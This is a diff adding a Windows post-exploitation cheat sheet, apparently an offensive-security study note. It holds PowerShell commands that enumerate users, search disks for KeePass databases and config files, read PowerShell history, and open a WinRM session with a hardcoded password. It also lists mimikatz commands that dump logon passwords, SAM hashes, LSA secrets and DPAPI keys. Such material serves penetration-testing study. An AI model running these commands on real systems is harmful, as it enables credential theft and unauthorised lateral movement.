@@ -29,6 +29,45 @@
 - offsec exploits db: https://github.com/offensive-security/exploitdb-bin-sploits
 - AD cheatsheet : https://wadcoms.github.io/
 - sweet potato rule all [potato exploits](https://jlajara.gitlab.io/Potatoes_Windows_Privesc) 
+
+- command to-go list
+```powershell
+Get-LocalUser
+Get-LocalGroup
+Get-LocalGroupMember adminteam
+systeminfo
+ipconfig /all
+route print
+netstat -nao
+Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
+Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
+Get-Process
+Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
+Get-ChildItem -Path C:\users -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
+runas /user:backupadmin cmd
+cat C:/xampp/mysql/bin/mysql.ini
+Get-History
+(Get-PSReadlineOption).HistorySavePath
+type C:\Users\dave\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+# windows creds object & winrm from powershell 
+$password = ConvertTo-SecureString "qwertqwertqwert123!!" -AsPlainText -Force
+$cred = New-Object System.Management.Automation.PSCredential("daveadmin", $password)
+Enter-PSSession -ComputerName CLIENTWK220 -Credential $cred
+##
+```
+
+- mimikatz
+```powershell
+privilege::debug
+sekurlsa::logonPasswords full
+sekurlsa::wdigest
+lsadump::sam
+lsadump::secrets
+lsadump::cache
+sekurlsa::dpapi
+
+```
+
 ### Unattended Windows Installations
 ```
 # credentails such as <Password>
